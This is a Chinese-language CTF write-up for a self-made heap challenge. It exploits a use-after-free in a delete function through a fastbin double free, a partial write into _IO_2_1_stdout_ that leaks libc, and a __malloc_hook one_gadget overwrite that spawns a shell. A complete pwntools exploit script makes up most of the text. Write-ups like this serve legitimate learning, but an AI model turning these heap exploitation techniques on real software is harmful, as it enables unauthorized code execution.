# Pwn

## 来源

V&N cnitlrt的面试,这是我自己按他要求出的题,然后自己打.


## 难度

5 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

## 简单描述

只有添加和删除功能, 添加的时候输入大小,再输入内容, 而删除根据索引进行删除.

## vul

```c
unsigned __int64 del()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  puts("idx: ");
  __isoc99_scanf("%d", &v1);
  free(*((void **)&pheap + 2 * v1)); //  UAF漏洞
  puts("OK");
  return __readfsqword(0x28u) ^ v2;
}
```



## 知识点

fastbin attack, IO_FILE

## 思路

开辟一个small bin, 然后通过fastbin attack partial write 修改unsoted bin 的 fd 的后两字节指向`_IO_2_1_stderr` + 157处, 使用fastbin attack_IO_2_1_stdout`结构体中泄漏libc, 再次使用fastbin attack 打入malloc_hook - 0x23处打one_gadget, realloc的push次数调整execve第二个参数, 打通概率 1 /16



## 利用

### 准备

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('2.del', str(1))
	sla(':', str(size))
	sa(':', data)

def rm(idx):
	sla('2.del', str(2))
	sla(':', str(idx))

def q():
	sla(':', str(3))	
	
#--------------------------Exploit--------------------------
def exploit():
	a = 0;
	
#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
```



### 堆布局

```python 
	ad(0x20, 'A') # idx 0 为了使用fastbin attack打入unsoted bin-0x10处

	p = 'A' * 0x50 #伪造的堆块,后面要申请到此处来实现修改chunk 2的size和fd
	p += p64(0) # rev_size
	p += p64(0x31) # size

	ad(0x60, p) # idx 1
	ad(0x80, 'B') # idx 2 为了partiwritefast bin attack实现打入_IO_2_1_stderr + 157处
	ad(0x20, 'A') # idx 3 为了使用fastbin attack打入unsoted bin-0x10处
	ad(0x60, 'A') # idx 4 为了与修改后的chunk 2在fastbin中连接起来,然后就可以实现打入IO_2_1_stdout中

	# for fastbin attack to _free_hook
	ad(0x60, 'A') # idx 5 为了fastbin attac 打入malloc_hook - 0x23
	ad(0x60, 'A') # idx 6 为了fastbin attac 打入malloc_hook - 0x23
```



### 打入chunk 2修改size 和fd

```python
	rm(3) # 为了 构造fastbin attack
	rm(0)
	rm(3)

	rm(2) # 先释放掉chunk 2,使fd 为main_arena + 0x58
    
    # 这里采用partial write 方式修改 chunk 3中的fd指向 chunk 2 - 0x10处，这里是我们伪造好的堆块
    ad(0x20, '\x90') # attack to chunk 2 - 0x10

	ad(0x20, 'A') # 调整
	ad(0x20, 'A') # 调整
	
    # 修改chunk 2 的size和fd
	p = p64(0)
	p += p64(0x71)  # 修改为fastbin, 绕过检查
	p += '\xdd\x25' # partial write指向_IO_2_1_stderr + 157处
	ad(0x20, p) # patial write to _IO_2_1_stderr_ + 157
    
```



### 打入_IO_2_1_stderr + 157处

满足size调试如下:

```
pwndbg> x /40gx (long int)&_IO_2_1_stdout_ - 0x43
0x7f007e1fe5dd <_IO_2_1_stderr_+157>:	0x007e1fd660000000	0x000000000000007f
0x7f007e1fe5ed <_IO_2_1_stderr_+173>:	0x0000000000000000	0x0000000000000000
0x7f007e1fe5fd <_IO_2_1_stderr_+189>:	0x0000000000000000	0x0000000000000000
0x7f007e1fe60d <_IO_2_1_stderr_+205>:	0x0000000000000000	0x007e1fc6e0000000
0x7f007e1fe61d <_IO_2_1_stderr_+221>:	0x00fbad288700007f	0x007e1fe6a3000000
0x7f007e1fe62d <_IO_2_1_stdout_+13>:	0x007e1fe6a300007f	0x007e1fe6a300007f
0x7f007e1fe63d <_IO_2_1_stdout_+29>:	0x007e1fe6a300007f	0x007e1fe6a300007f
0x7f007e1fe64d <_IO_2_1_stdout_+45>:	0x007e1fe6a300007f	0x007e1fe6a300007f
0x7f007e1fe65d <_IO_2_1_stdout_+61>:	0x007e1fe6a400007f	0x000000000000007f
```

把刚才所构建的fastbin chunk 2放入fastbin 中

```python
	# fastbin attack to _IO__2_1_stderr + 157
    # 为了 构造fastbin attack
	rm(4)
	rm(1)
	rm(4)
	ad(0x60, '\xa0') # 将fastbin chunk 2放入fastbin 中

	# for alignment
	ad(0x60, 'A')
	ad(0x60, 'A')
	ad(0x60, 'A')
```



### 泄漏libc

修改`_IO_2_1_stdout`结构体实现打印出libc中的地址

```python
	p = 'A' * 0x33
	p += p64(0xfbad3c80)
	p += p64(0) * 3
	p += p8(8)

	ad(0x60, p)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - (0x7ffff7dd2608 - 0x7ffff7a0d000)
	li('libc_base ' + hex(lib.address))
```



### 打入__malloc_hook - 0x23处

```python
	# fast bin attack to malloc_hook - 0x23
    # 为了 构造fastbin attack
	rm(5)	
	rm(6)	
	rm(5)	

	p = p64(lib.sym['__malloc_hook'] - 0x23)
	ad(0x68, p)
	ad(0x68, 'A') # for ajust
	ad(0x68, 'A') # for ajust


	
```



### 修改malloc_hook 和realloc_hook打one_gadget

通过realloc的push次数来调整execve的第二个参数

```python
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[1]

	p = 'A' * (0x13 -8)
	p += p64(one_gadget)
	p += p64(lib.sym['realloc'] + 12)
	ad(0x68, p)
```



### get shell 

```python
	# get shell
	ru('del')
	sl('1')
```

## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('2.del', str(1))
	sla(':', str(size))
	sa(':', data)

def rm(idx):
	sla('2.del', str(2))
	sla(':', str(idx))

def q():
	sla(':', str(3))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x20, 'A') # idx 0

	p = 'A' * 0x50
	p += p64(0)
	p += p64(0x31)

	ad(0x60, p) # idx 1
	ad(0x80, 'B') # idx 2
	ad(0x20, 'A') # idx 3
	ad(0x60, 'A') # idx 4

	# for fastbin attack to _free_hook
	ad(0x60, 'A') # idx 5
	ad(0x60, 'A') # idx 6


	rm(3)
	rm(0)
	rm(3)

	rm(2) # for patial write to 

	ad(0x20, '\x90') # attack to chunk 2 - 0x10

	ad(0x20, 'A')
	ad(0x20, 'A')

	p = p64(0)
	p += p64(0x71)
	p += '\xdd\x25'
	ad(0x20, p) # patial write to _IO_2_1_stderr_ + 157


	# fastbin attack to _IO__2_1_stderr + 157
	rm(4)
	rm(1)
	rm(4)
	ad(0x60, '\xa0')

	# for alignment
	ad(0x60, 'A')
	ad(0x60, 'A')
	ad(0x60, 'A')
	
	p = 'A' * 0x33
	p += p64(0xfbad3c80)
	p += p64(0) * 3
	p += p8(8)

	ad(0x60, p)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - (0x7ffff7dd2608 - 0x7ffff7a0d000)
	li('libc_base ' + hex(lib.address))

	# fast bin attack to malloc_hook - 0x23
	rm(5)	
	rm(6)	
	rm(5)	

	p = p64(lib.sym['__malloc_hook'] - 0x23)
	ad(0x68, p)
	ad(0x68, 'A') # for ajust
	ad(0x68, 'A') # for ajust


	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[1]

	p = 'A' * (0x13 -8)
	p += p64(one_gadget)
	p += p64(lib.sym['realloc'] + 12)
	ad(0x68, p)

	# get shell
	ru('del')
	sl('1')

	#db()

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''

```

